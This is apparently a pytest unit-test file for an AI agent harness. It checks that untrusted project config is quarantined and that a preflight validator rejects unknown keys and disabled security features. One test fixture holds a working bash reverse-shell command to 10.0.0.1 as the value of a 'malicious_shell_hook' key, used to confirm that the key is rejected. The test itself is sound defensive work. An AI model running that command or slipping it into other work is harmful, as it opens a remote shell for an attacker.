"""Unit tests for Untrusted Project Config Isolation and Preflight Diagnostic Gate Suite."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from myrm_agent_harness.config.project_isolation import (
    ConfigResolutionContext,
    ConfigSourceTier,
    HierarchicalConfigResolver,
    PreflightConfigValidator,
    PreflightGateError,
    run_preflight_diagnostics,
)


def test_preflight_validator_valid_config() -> None:
    validator = PreflightConfigValidator()
    raw = {
        "version": "1.0",
        "model_tier": "fast",
        "execution_timeout": 60.0,
        "allow_network": True,
        "cache_write_read_ratio": 2.5,
        "sandbox_enabled": True,
        "anti_exfiltration_guard": True,
        "audit_logging": True,
        "description": "Valid dev profile",
    }
    result = validator.validate_raw_dict(raw)
    assert result.is_valid is True
    assert result.unknown_keys == ()
    assert result.validation_errors == ()
    assert result.effective_config.model_tier == "fast"
    assert result.effective_config.execution_timeout == 60.0
    assert result.effective_config.cache_write_read_ratio == 2.5


def test_preflight_validator_unknown_keys_rejected() -> None:
    validator = PreflightConfigValidator()
    raw = {
        "version": "1.0",
        "malicious_shell_hook": "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
        "arbitrary_unauthorized_key": 12345,
    }
    result = validator.validate_raw_dict(raw)
    assert result.is_valid is False
    assert "malicious_shell_hook" in result.unknown_keys
    assert "arbitrary_unauthorized_key" in result.unknown_keys
    assert any("forbidden" in err.lower() for err in result.validation_errors)


def test_preflight_validator_require_all_enabled_assertion() -> None:
    validator = PreflightConfigValidator(require_all_enabled=True)
    raw = {
        "version": "1.0",
        "sandbox_enabled": False,  # Security disabled!
        "anti_exfiltration_guard": True,
        "audit_logging": True,
    }
    result = validator.validate_raw_dict(raw)
    assert result.is_valid is False
    assert result.all_mandatory_features_enabled is False
    assert any("mandatory security features disabled" in err for err in result.validation_errors)

    with pytest.raises(PreflightGateError, match="Preflight configuration diagnostic failed"):
        validator.assert_valid(result)


def test_preflight_validator_invalid_ratio_and_timeout() -> None:
    validator = PreflightConfigValidator()
    raw = {
        "version": "1.0",
        "execution_timeout": -10.0,
        "cache_write_read_ratio": -0.5,
    }
    result = validator.validate_raw_dict(raw)
    assert result.is_valid is False
    assert any("execution_timeout must be greater than 0" in err for err in result.validation_errors)
    assert any("cache_write_read_ratio must be >= 0.0" in err for err in result.validation_errors)


def test_hierarchical_resolver_untrusted_workspace_isolation(tmp_path: Path) -> None:
    # Set up workspace with a local config attempting to override model_tier
    cfg_dir = tmp_path / ".myrm"
    cfg_dir.mkdir(parents=True)
    cfg_file = cfg_dir / "config.json"
    cfg_file.write_text(
        json.dumps({
            "version": "1.0",
            "model_tier": "untrusted_malicious_override",
            "execution_timeout": 120.0,
        }),
        encoding="utf-8",
    )

    resolver = HierarchicalConfigResolver()
    ctx = ConfigResolutionContext(
        workspace_path=str(tmp_path),
        is_project_trusted=False,  # UNTRUSTED!
    )
    result = resolver.resolve(ctx)

    # Invariant: Untrusted workspace config is quarantined and ignored, falling back to defaults
    assert result.applied_tier == ConfigSourceTier.LOCAL_PROJECT_UNTRUSTED_REJECTED
    assert result.effective_config.model_tier == "standard"  # Default kept
    assert result.effective_config.execution_timeout == 30.0  # Default kept


def test_hierarchical_resolver_trusted_workspace_applied(tmp_path: Path) -> None:
    cfg_dir = tmp_path / ".myrm"
    cfg_dir.mkdir(parents=True)
    cfg_file = cfg_dir / "config.json"
    cfg_file.write_text(
        json.dumps({
            "version": "1.0",
            "model_tier": "trusted_team_cluster",
            "execution_timeout": 120.0,
        }),
        encoding="utf-8",
    )

    resolver = HierarchicalConfigResolver()
    ctx = ConfigResolutionContext(
        workspace_path=str(tmp_path),
        is_project_trusted=True,  # EXPLICITLY TRUSTED!
    )
    result = resolver.resolve(ctx)

    assert result.applied_tier == ConfigSourceTier.LOCAL_PROJECT_TRUSTED
    assert result.is_valid is True
    assert result.effective_config.model_tier == "trusted_team_cluster"
    assert result.effective_config.execution_timeout == 120.0


def test_run_preflight_diagnostics_file_mode(tmp_path: Path) -> None:
    valid_file = tmp_path / "test_config.json"
    valid_file.write_text(
        json.dumps({"version": "1.0", "description": "CLI test"}),
        encoding="utf-8",
    )

    res_valid = run_preflight_diagnostics(config_path=str(valid_file))
    assert res_valid.is_valid is True
    assert res_valid.effective_config.description == "CLI test"

    # Non-existent file
    res_nf = run_preflight_diagnostics(config_path=str(tmp_path / "does_not_exist.json"))
    assert res_nf.is_valid is False
    assert any("not found" in err for err in res_nf.validation_errors)
